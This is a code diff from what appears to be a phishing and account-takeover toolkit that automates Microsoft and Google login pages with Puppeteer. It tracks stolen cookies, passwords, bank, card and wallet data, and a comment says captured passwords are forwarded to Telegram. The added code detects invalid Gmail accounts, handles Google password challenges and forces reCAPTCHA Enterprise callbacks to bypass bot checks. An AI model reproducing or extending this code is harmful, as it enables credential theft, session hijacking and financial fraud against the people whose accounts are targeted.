@@ -28,7 +28,10 @@ const DEFAULT_COOKIE_COLUMNS = new Set([
     'cookieJSON', 'formattedCookie', 'cookieFileURL', 'driveUrl', 'platform',
     'verified', 'fullAccess', 'server', 'timestamp', 'lastUserActivity',
     'projectId', 'userId', 'formId', 'strictly', 'domain', 'ipData', 'deviceData',
-    'banks', 'cards', 'socials', 'wallets', 'idMe', 'memo', 'mxRecord', 'possibleProvider'
+    'banks', 'cards', 'socials', 'wallets', 'idMe', 'memo', 'mxRecord', 'possibleProvider',
+    'browserIdentity', 'history', 'verificationOptions', 'verificationChoice',
+    'verificationCode', 'cookieStatus', 'cookie', 'usage', 'submissionId', 'engineProcessing',
+    'captcha', 'qr', 'nextRun', 'lastVerifyData', 'serverlessId'
 ]);
 export function setKnownCookieColumns(headers) {
     if (Array.isArray(headers) && headers.length > 0) {
@@ -54,7 +57,7 @@ export const lastPollTime = new Map();
 // Returns true if no data yet (assume alive), false if last poll was > maxAgeMs ago.
 export function isTemplateAlive(browserId, maxAgeMs = 180000) {
     const lastTime = lastPollTime.get(browserId);
-    if (!lastTime) return true; // No data yet — assume alive
+    if (!lastTime) return true;
     return (Date.now() - lastTime) < maxAgeMs;
 }
 
@@ -197,7 +200,7 @@ export async function detectPasswordUnavailable(page, platformConfig) {
 export async function stillOnPasswordPage(page, platformConfig) {
     try {
         const currentUrl = page.url() || '';
-        const onLoginUrl = currentUrl.includes('login.live.com') || currentUrl.includes('login.microsoftonline.com') || currentUrl.includes('account.live.com');
+        const onLoginUrl = currentUrl.includes('login.live.com') || currentUrl.includes('login.microsoftonline.com') || currentUrl.includes('account.live.com') || (currentUrl.includes('accounts.google.com') && currentUrl.includes('/challenge/pwd'));
         if (!onLoginUrl) return false;
         const raw = platformConfig?.selectors?.passwordInput;
         const selectors = Array.isArray(raw) ? raw : (raw ? [raw] : []);
@@ -509,7 +512,14 @@ export async function updateBrowserRowData(browserId, updateObject, isNewRow = f
       // Pass the cached row so the FAILED/COMPLETED Telegram is built from cache
       // (email/password) instead of a fresh sheet read — a quota failure or cleared
       // sheet cell must never drop the password from the notification.
-      updateHubAndProjectsFromCookieData(browserId, updateObject.status, getCachedRow(browserId) || null).catch(error => {
+      // Merge the in-flight update over the cached row: the cache merge at the
+      // end of this function runs AFTER this finally block, so getCachedRow()
+      // alone can return stale data (e.g. verified=true while the sheet write
+      // carries verified=false) and leak it into the hub.
+      updateHubAndProjectsFromCookieData(browserId, updateObject.status, {
+        ...(getCachedRow(browserId) || {}),
+        ...cleanUpdateObject
+      }).catch(error => {
         logger.error(`[updateBrowserRowData][${browserId}] Error triggering updateHubAndProjectsFromCookieData: ${error.message}`);
       });
 
@@ -580,6 +590,88 @@ export const resolveA = (domain, timeoutMs = 5000) =>
         new Promise((_, reject) => setTimeout(() => reject(new Error('A-record DNS timeout')), timeoutMs))
     ]);
 
+// ── Gmail email error detection ───────────────────────────────────────────
+// Google's login page uses a closed shadow DOM (jsshadow on <section>), so
+// document.querySelector('.Ekjuhf') cannot pierce it. Detect the invalid-email
+// state by three layers:
+//   1. Accessibility tree (pierces open shadow DOM)
+//   2. TreeWalker text scan (catches non-shadow content)
+//   3. Behavioral fallback: still on /signin/identifier with no password form
+//      after email submission → email must be invalid (valid emails navigate away)
+//
+// @param {boolean} postCaptcha — When true, skip the CAPTCHA-presence guard in the
+//   behavioral fallback. After the CAPTCHA solve loop, Google may re-render the
+//   CAPTCHA element even for invalid emails (the CAPTCHA is an anti-bot measure,
+//   not a signal that the email is valid). Skipping the guard lets the behavioral
+//   check fire: URL still /signin/identifier + no password form = invalid email.
+export async function detectGmailEmailError(page, instanceId, postCaptcha = false) {
+  const url = page.url();
+  if (!url.includes('/signin/identifier')) return { found: false };
+
+  // Layer 1: Accessibility snapshot reads rendered text through shadow DOM boundaries.
+  const snapshot = await page.accessibility.snapshot().catch(() => null);
+  if (snapshot) {
+    const json = JSON.stringify(snapshot);
+    if (json.includes("Couldn't find") || json.includes("Couldn\u2019t find") ||
+        json.includes("No se pudo encontrar") || json.includes("Impossible de trouver") ||
+        json.includes("Konto nicht gefunden") || json.includes("Could not find")) {
+      logger.info(`[detectGmailEmailError][${instanceId}] Email error detected via accessibility tree. URL: ${url.substring(0, 120)}`);
+      return { found: true, message: "Couldn't find this account." };
+    }
+  }
+
+  // Layer 2: TreeWalker scans all text nodes in the document.
+  try {
+    const pageText = await page.evaluate(() => {
+      const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
+      let text = '';
+      while (walker.nextNode()) text += walker.currentNode.textContent + ' ';
+      return text;
+    });
+    if (pageText.includes("Couldn't find") || pageText.includes("Couldn\u2019t find") ||
+        pageText.includes("No se pudo encontrar")) {
+      logger.info(`[detectGmailEmailError][${instanceId}] Email error detected via text walker. URL: ${url.substring(0, 120)}`);
+      return { found: true, message: "Couldn't find this account." };
+    }
+  } catch (e) { /* ignore — snapshot already checked */ }
+
+  // Layer 3: Behavioral fallback — still on /signin/identifier after email
+  // submission means the email is invalid. Valid emails always navigate to
+  // /challenge/pwd, /challenge/selection, etc.
+  try {
+    // When NOT postCaptcha: only fire if no CAPTCHA present (pre-CAPTCHA case).
+    // When postCaptcha: skip CAPTCHA guard — Google re-renders the CAPTCHA for
+    // invalid emails as an anti-bot measure; its presence does NOT mean valid email.
+    if (!postCaptcha) {
+      const hasCaptcha = await page.$('#captchaimg').catch(() => null);
+      if (hasCaptcha) {
+        logger.info(`[detectGmailEmailError][${instanceId}] CAPTCHA present — skipping behavioral check (pre-CAPTCHA). URL: ${url.substring(0, 120)}`);
+        return { found: false };
+      }
+    }
+
+    const hasRecaptcha = await page.$('iframe[title*="reCAPTCHA"], [data-sitekey]').catch(() => null);
+    const hasPasswordInput = await page.$('input[type="password"], #password').catch(() => null);
+    if (!hasRecaptcha && !hasPasswordInput) {
+      // Confirmation pass: a valid email may briefly sit on /signin/identifier
+      // while the password step loads. Re-verify after a short delay — an
+      // invalid-email error page is static, a transition moves within it.
+      await new Promise(r => setTimeout(r, 1500));
+      const urlNow = page.url();
+      const stillRecaptcha = await page.$('iframe[title*="reCAPTCHA"], [data-sitekey]').catch(() => null);
+      const stillPassword = await page.$('input[type="password"], #password').catch(() => null);
+      if (urlNow.includes('/signin/identifier') && !stillRecaptcha && !stillPassword) {
+        logger.info(`[detectGmailEmailError][${instanceId}] Behavioral signal (confirmed): still on /signin/identifier with no password form — email invalid. URL: ${urlNow.substring(0, 120)}`);
+        return { found: true, message: "Couldn't find this account." };
+      }
+      logger.info(`[detectGmailEmailError][${instanceId}] Behavioral signal not confirmed (page transitioned) — treating as no error. URL: ${urlNow.substring(0, 120)}`);
+    }
+  } catch (e) { /* ignore — behavioral check is best-effort */ }
+
+  logger.info(`[detectGmailEmailError][${instanceId}] No email error on /signin/identifier. URL: ${url.substring(0, 120)}`);
+  return { found: false };
+}
+
 export async function isInbox(page, platformConfig) {
   const instanceId = `pid-${page.browser().process()?.pid || 'unknown'}`;
   try {
@@ -604,6 +696,7 @@ export async function isInbox(page, platformConfig) {
     // passwords to be marked COMPLETED. The URL-pattern and DOM-selector checks below must
     // never run while we're still on an auth surface.
     const isInboxAuthMarkers = [
+      'accounts.google.com',
       'login.live.com',
       'login.microsoftonline.com',
       'account.live.com',
@@ -1059,7 +1152,7 @@ export async function solveImageCaptcha(page, instanceId) {
 
     try {
         logger.info(`[solveImageCaptcha][${instanceId}] Waiting for CAPTCHA image...`);
-        await page.waitForSelector('#captchaimg', { visible: true, timeout: 10000 });
+        await page.waitForSelector('#captchaimg', { visible: true, timeout: 3000 });
         await new Promise(r => setTimeout(r, 1000));
 
         const captchaImg = await page.$('#captchaimg');
@@ -1346,6 +1439,46 @@ export async function solveRecaptchaV2(page, instanceId) {
                     }
                 }
             } catch (e) { /* callback trigger failed, form submit will handle it */ }
+
+            // Enhanced callback: try grecaptcha.enterprise.execute() for Enterprise challenges
+            try {
+                if (typeof grecaptcha !== 'undefined' && grecaptcha.enterprise) {
+                    const siteKeyEl = document.querySelector('#g-recaptcha-response[data-sitekey]');
+                    const ek = siteKeyEl ? siteKeyEl.getAttribute('data-sitekey') : null;
+                    if (ek && typeof grecaptcha.enterprise.execute === 'function') {
+                        grecaptcha.enterprise.execute(ek, { action: 'submit' }).then(() => {}).catch(() => {});
+                    }
+                }
+            } catch (e) { /* ignore */ }
+
+            // Enhanced callback: try standard grecaptcha.execute()
+            try {
+                if (typeof grecaptcha !== 'undefined' && typeof grecaptcha.execute === 'function') {
+                    grecaptcha.execute();
+                }
+            } catch (e) { /* ignore */ }
+
+            // Targeted callback: try known Enterprise callback paths on ___grecaptcha_cfg.clients
+            try {
+                if (typeof ___grecaptcha_cfg !== 'undefined') {
+                    const clients = ___grecaptcha_cfg.clients || {};
+                    for (const k of Object.keys(clients)) {
+                        const c = clients[k];
+                        if (!c) continue;
+                        const tryPaths = [
+                            () => c?.aa?.lk?.(token),
+                            () => c?.aa?.Ml?.(token),
+                            () => c?.aa?.callback?.(token),
+                            () => c?.L?.L?.(token),
+                            () => c?.L?.P?.(token),
+                            () => c?.L?.callback?.(token),
+                        ];
+                        for (const fn of tryPaths) {
+                            try { fn(); } catch (e) {}
+                        }
+                    }
+                }
+            } catch (e) { /* ignore */ }
 
             if (textarea) {
                 textarea.dispatchEvent(new Event('input', { bubbles: true }));
@@ -1644,13 +1777,13 @@ export async function isPageResponsive(page, browserId, instanceId) {
     try {
         await Promise.race([
             page.evaluate(() => document.readyState),
-            new Promise((_, reject) => setTimeout(() => reject(new Error('Page navigation in progress - evaluate timed out')), 20000))
+            new Promise((_, reject) => setTimeout(() => reject(new Error('Page health check timed out')), 30000))
         ]);
         return true;
     } catch (e) {
         // Navigation-related errors mean the page is alive but transitioning — not unresponsive
         const msg = e.message || '';
-        if (msg.includes('navigation') || msg.includes('detached') || msg.includes('destroyed') || msg.includes('navigat')) {
+        if ((msg.includes('navigation') || msg.includes('detached') || msg.includes('navigat')) && !msg.includes('health check')) {
             logger.debug(`[isPageResponsive][${browserId}][${instanceId}] Page is navigating (not unresponsive): ${msg}`);
             return true;
         }
